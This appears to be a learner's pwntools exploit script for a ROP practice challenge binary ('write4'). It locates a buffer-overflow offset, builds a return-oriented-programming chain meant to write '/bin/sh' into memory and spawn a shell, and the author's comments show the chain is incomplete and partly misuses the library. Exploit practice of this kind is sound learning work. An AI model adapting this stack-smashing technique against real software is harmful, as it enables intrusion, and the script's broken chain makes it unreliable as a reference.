#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './write4'
rop = ROP(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x4007e7
break *0x400807
break *0x400820
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# initialize
io = start()

# grab the first line and then send our line
io.recv()
io.sendline(cyclic(100))
io.wait()

# get core file and let's read in the values at time of crash
core = io.corefile
base = core.rsp
print "value at time of crash %s" % p64(core.fault_addr)
pattern_offset = cyclic_find(p64(core.fault_addr))

if pattern_offset <= 0:
    print "Couldn't find the offset"
else:
    print "Pattern offset in hex: %s" % hex(pattern_offset)
    print "Pattern offset in dec: %s" % pattern_offset


# build rop chain
#rop.raw(0x400820) # try to get to the UsefulGadget
rop.raw(0x400890) #  pop r14; pop r15; ret; 
rop.raw(0x601050) # The address where the string will be written
rop(p64('/bin/sh')) # how do you pass a string into rop.raw?

print rop.dump() # print out current rop chain

# build payload
payload = "A"*pattern_offset + rop.chain()
payload += "C" * (0x200 - len(payload))

# run again
#args.GDB = True
io = start()
io.recv()
io.sendline(payload)

# finish with interactive
io.interactive()
